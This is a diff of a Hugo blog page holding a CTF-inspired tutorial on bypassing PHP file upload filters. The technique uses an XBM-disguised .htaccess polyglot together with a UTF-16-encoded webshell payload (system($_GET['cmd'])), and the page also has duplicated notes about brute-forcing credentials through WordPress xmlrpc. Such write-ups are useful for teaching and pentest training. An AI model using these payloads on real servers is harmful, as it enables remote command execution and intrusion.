@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.72.0" />
+<meta name="generator" content="Hugo 0.90.1" />
 
   <meta property="og:title" content="[WEB] Bypass file upload filter with .htaccess" />
 <meta property="og:description" content="" />
@@ -59,10 +59,11 @@
   <script src="https://thibaud-robin.fr/js/lightbox.min.js"></script>
   <script src="https://thibaud-robin.fr/js/termynal.js"></script>
   <script src="https://thibaud-robin.fr/js/emojify.min.js"></script>
-  
+
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/termynal.css">
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/hover.css">
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/emojify.min.css">
+  <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/darkreader.css">
 
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133286401-1"></script>
@@ -213,9 +214,27 @@
             <p>I think you know what I am talking about. The &ldquo;file upload&rdquo; vulnerability is familiar for you ? Nice. So you know how it could be difficult to bypass protection to upload a webshell. I will show you a little technique to add to your test when you are trying to exploit file upload :)</p>
 <p>This technique is inspired from the challenge <strong>l33t-hoster</strong> of the <a href="https://ctftime.org/event/686">Insomni&rsquo;hack Teaser 2019 CTF</a></p>
 <p>So follow the guide !</p>
+<div class="alert protips">
+    <i class="logo fas fa-hand-holding-heart"></i>
+    <p class="text"><strong>ProTips</strong> : Xmlrpc engine is really usefull in wordpress compromission scenarios. This feature permits to performs heavy and quick credentials bruteforcing. Also, severals vulnerability affects this functionnality in older version. 
+    
+    </p>
+</div>
+<div class="alert danger">
+    <i class="logo fas fa-skull-crossbones"></i>
+    <p class="text"><strong>Danger</strong> : Xmlrpc engine is really usefull in wordpress compromission scenarios. This feature permits to performs heavy and quick credentials bruteforcing. Also, severals vulnerability affects this functionnality in older version. 
+    
+    </p>
+</div>
+<div class="alert warning">
+    <i class="logo fas fa-exclamation-triangle"></i>
+    <p class="text"><strong>Warning</strong> : Xmlrpc engine is really usefull in wordpress compromission scenarios. This feature permits to performs heavy and quick credentials bruteforcing. Also, severals vulnerability affects this functionnality in older version. 
+    
+    </p>
+</div>
 <h2 id="show-me-your-protection">Show me your protection</h2>
 <p>First step is to understand (at least try) the protection. For this explanation, we will work on a nice PHP example.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#75715e">&lt;?php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;source&#34;</span>])) 
     <span style="color:#66d9ef">die</span>(<span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>));
 
@@ -224,7 +243,7 @@
 <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#34;home&#34;</span>])) {
     $_SESSION[<span style="color:#e6db74">&#34;home&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">random_bytes</span>(<span style="color:#ae81ff">20</span>));
 }
-$userdir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;images/</span><span style="color:#e6db74">{</span>$_SESSION[&#34;home&#34;]<span style="color:#e6db74">}</span><span style="color:#e6db74">/&#34;</span>;
+$userdir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;images/</span><span style="color:#e6db74">{</span>$_SESSION[<span style="color:#e6db74">&#34;home&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">/&#34;</span>;
 <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($userdir)) {
     <span style="color:#a6e22e">mkdir</span>($userdir);
 }
@@ -288,14 +307,14 @@ $disallowed_ext <span style="color:#f92672">=</span> <span style="color:#66d9ef"
 }
 <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;/ul&gt;&#34;</span>;
 
-<span style="color:#75715e">?&gt;</span>
-
-&lt;<span style="color:#f92672">h1</span>&gt;Upload your pics!&lt;/<span style="color:#f92672">h1</span>&gt;
-&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
-    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;image&#34;</span>&gt;
-    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">upload</span>&gt;
-&lt;/<span style="color:#f92672">form</span>&gt;
-</code></pre></div><p>And it look like this</p>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;h1&gt;Upload your pics!&lt;/h1&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;form method=&#34;POST&#34; action=&#34;?&#34; enctype=&#34;multipart/form-data&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;input type=&#34;file&#34; name=&#34;image&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;input type=&#34;submit&#34; name=upload&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/form&gt;
+</span></code></pre></div><p>And it look like this</p>
 <p><img src="/img/articles/bypass-filter-upload-1.png" alt="" title=""></p>
 <p>To sum up. Filters do :</p>
 <ul>
@@ -312,17 +331,17 @@ $disallowed_ext <span style="color:#f92672">=</span> <span style="color:#66d9ef"
 <p><em>&quot;.htaccess files provide a way to make configuration changes on a per-directory basis.&quot;</em></p>
 <p>You can read more here : <a href="https://httpd.apache.org/docs/2.4/en/howto/htaccess.html">https://httpd.apache.org/docs/2.4/en/howto/htaccess.html</a></p>
 <p>Pretty clear. Thanks google ! So it&rsquo;s a configuration file. Now look at this conf :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">AddType application/x-httpd-php .php16      <span style="color:#75715e"># Say all file with extension .php16 will execute php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">AddType application/x-httpd-php .php16      <span style="color:#75715e"># Say all file with extension .php16 will execute php</span>
 
 php_value zend.multibyte <span style="color:#ae81ff">1</span>                  <span style="color:#75715e"># Active specific encoding (you will see why after :D)</span>
 php_value zend.detect_unicode <span style="color:#ae81ff">1</span>             <span style="color:#75715e"># Detect if the file have unicode content</span>
 php_value display_errors <span style="color:#ae81ff">1</span>                  <span style="color:#75715e"># Display php errors</span>
 </code></pre></div><p>So if you can upload this <code>.htaccess</code> file we will be the king and we will can execute our php code.</p>
 <p>So try to upload it and we obtain :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">lol filename is empty
-</code></pre></div><p>Damned ! But if we analyse the code, we see it split the string in twice with <code>.</code> and check if there is two parts on the obtained array. So if we send a filename like <code>..htaccess</code>, the code will split in two parts : <code>.</code> and <code>.htaccess</code>. Test it !</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">not an image.
-</code></pre></div><p>S**t ! Yeah our file is not an image, it&rsquo;s a htaccess file.</p>
+<pre tabindex="0"><code>lol filename is empty
+</code></pre><p>Damned ! But if we analyse the code, we see it split the string in twice with <code>.</code> and check if there is two parts on the obtained array. So if we send a filename like <code>..htaccess</code>, the code will split in two parts : <code>.</code> and <code>.htaccess</code>. Test it !</p>
+<pre tabindex="0"><code>not an image.
+</code></pre><p>S**t ! Yeah our file is not an image, it&rsquo;s a htaccess file.</p>
 <h2 id="welcome-to-polyglot-file">Welcome to polyglot file</h2>
 <p>What is polyglot file ?</p>
 <p><em>&ldquo;In computing, a polyglot is a computer program or script written in a valid form of multiple programming languages, which performs the same operations or output independent of the programming language used to compile or interpret it.&quot;</em></p>
@@ -332,7 +351,7 @@ php_value display_errors <span style="color:#ae81ff">1</span>                  <
 <p>Ok but what is a xbm file ? Look at wikipedia my dear : <a href="https://en.wikipedia.org/wiki/X_BitMap">https://en.wikipedia.org/wiki/X_BitMap</a></p>
 <p><em>&ldquo;In computer graphics, the X Window System used X BitMap (XBM), a plain text binary image format, for storing cursor and icon bitmaps used in the X GUI.&quot;</em></p>
 <p>And there is an example :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#define test_width 16</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#define test_width 16</span>
 <span style="color:#75715e">#define test_height 7</span>
 static char test_bits<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
 0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
@@ -341,7 +360,7 @@ static char test_bits<span style="color:#f92672">[]</span> <span style="color:#f
 <p><img src="https://media.giphy.com/media/WuGSL4LFUMQU/giphy.gif" alt="" title=""></p>
 <p>The format of xbitmap is pretty clear : you set the image size on the first line of the file. And we&rsquo;ve got a <code>#</code> in front of the line ! So our <code>.htaccess</code> will not be disturbed by the xbitmap header. And with this trick <strong>we bypass size and image filter</strong>. Let&rsquo;s try this.</p>
 <p>There is our new <code>..htaccess</code> file</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)</span>
 <span style="color:#75715e">#define height 1337                         # Define the height</span>
 
 AddType application/x-httpd-php .php16      <span style="color:#75715e"># Say all file with extension .php16 will execute php</span>
@@ -356,18 +375,18 @@ We don&rsquo;t see our <code>.htaccess</code> because apache default configurati
 <p>Nice ! I uploaded my <code>.htaccess</code> to run the php contain in my <code>.php16</code> files. But how can I upload php to bypass the filter on the code. The answer is simple : encode your payload.</p>
 <p>Explanation. PHP support several form of encoding. Currently, you are writing in utf-8, but php also support utf-16 encoding. There is the same payload but encoded in utf-8 and after in utf-16</p>
 <p>In utf-8, a character is encoded on 1 byte.</p>
-<pre><code>00000000: 3c3f 7068 7020 7379 7374 656d 2824 5f47  &lt;?php system($_G
+<pre tabindex="0"><code>00000000: 3c3f 7068 7020 7379 7374 656d 2824 5f47  &lt;?php system($_G
 00000010: 4554 5b27 636d 6427 5d29 3b20 6469 6528  ET['cmd']); die(
 00000020: 293b 203f 3e0a                           ); ?&gt;.
 </code></pre><p>But in utf-16, the character is encoded on 2 bytes.</p>
-<pre><code>00000000: 003c 003f 0070 0068 0070 0020 0073 0079  .&lt;.?.p.h.p. .s.y
+<pre tabindex="0"><code>00000000: 003c 003f 0070 0068 0070 0020 0073 0079  .&lt;.?.p.h.p. .s.y
 00000010: 0073 0074 0065 006d 0028 0024 005f 0047  .s.t.e.m.(.$._.G
 00000020: 0045 0054 005b 0027 0063 006d 0064 0027  .E.T.[.'.c.m.d.'
 00000030: 005d 0029 003b 0020 0064 0069 0065 0028  .].).;. .d.i.e.(
 00000040: 0029 003b 0020 003f 003e 0a              .).;. .?.&gt;.
 </code></pre><p>I choose here utf-16 Big Endian encoding (to avoid some php bug). So we will have padding before our char : <code>003c</code> for the char <code>&lt;</code> in utf-16 instead of <code>3c</code> in utf-8. With this trick, the filter will not be triggered !</p>
 <p>Here is a little python script to automate payload creation. You have to put the xbitmap signature to bypass the others filters.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
 <span style="color:#75715e"># Description : create and bypass file upload filter with .htaccess</span>
 <span style="color:#75715e"># Author : Thibaud Robin</span>
 
@@ -428,7 +447,7 @@ generate_php_file(<span style="color:#e6db74">&#34;info.php16&#34;</span>, <span
 		</ul>
 	</div>
 
-	<p>&copy; 2020. All rights reserved.</p>
+	<p>&copy; 2021. All rights reserved.</p>
 </div>
     </div>
   </div>
